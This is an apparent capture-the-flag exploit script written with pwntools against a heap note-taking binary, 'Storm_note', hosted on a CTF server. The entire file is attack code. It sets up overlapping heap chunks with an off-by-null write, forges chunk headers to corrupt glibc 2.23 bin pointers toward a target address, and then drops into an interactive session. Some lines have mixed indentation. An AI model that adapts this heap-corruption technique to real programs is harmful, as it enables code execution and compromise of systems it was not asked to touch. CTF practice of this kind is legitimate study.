from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./Storm_note")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./Storm_note")
else:
	p = remote("domain:ctf1.linkedbyx.com",10264)
	libc = ELF("./libc-2.23.so")
	elf = ELF("./Storm_note")

def add(size):
	p.sendlineafter("Choice: ","1")
	p.sendlineafter("size ?\n",str(size))
	p.recvuntil("Done\n")

def edit(index,content):
	p.sendlineafter("Choice: ","2")
	p.sendlineafter("Index ?\n",str(index))
        p.sendafter("Content: \n",content)
        p.recvuntil("Done\n")

def free(index):
	p.sendlineafter("Choice: ","3")
	p.sendlineafter("Index ?\n",str(index))

def secret(buf):
	p.sendlineafter("Choice: ","666")
        p.sendlineafter("let you in\n",buf)

code_base = 0x555555554000
def debugf():
	gdb.attach(p,"b *{b1}".format(b1 = hex(code_base + 0x1079)))
context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
#debugf()
add(0x18) #0
size = 0x700
add(size) #1
add(0x20) #2
add(0x40) #3
add(0x40) #4
edit(1,"\x00" * (size - 0x10) + p64(size) + p64(0x11))
free(1)
edit(0,"a"*0x18)
add(0xf0) #1
add(size - 0x100 - 0x10) #4
size2 = size - 0x100 - 0x10
free(1)
#debugf()
free(2)
add(0x730) #1
payload = "\x00" * (0x100 - 8) + p64(size2 + 1) + "\x00" * (size2 - 8) + p64(0x11) + p64(0) + p64(0x11)
edit(1,payload)
free(5)
free(3)
target = 0xABCD0100
payload = "\x00" * (0x100 - 8) + p64(size2 + 1) + "\x00" * (size2 - 8) + p64(0x11) + p64(0) + p64(0x11)
payload = "\x00" * (0x100 - 8) + p64(size2 + 1) + p64(0) + p64(target - 0x20 + 8) + p64(0) + p64(target - 0x20 - 0x18 - 5)
debugf()
edit(1,payload)
add(0x40)
add(0x5e0)
p.interactive()
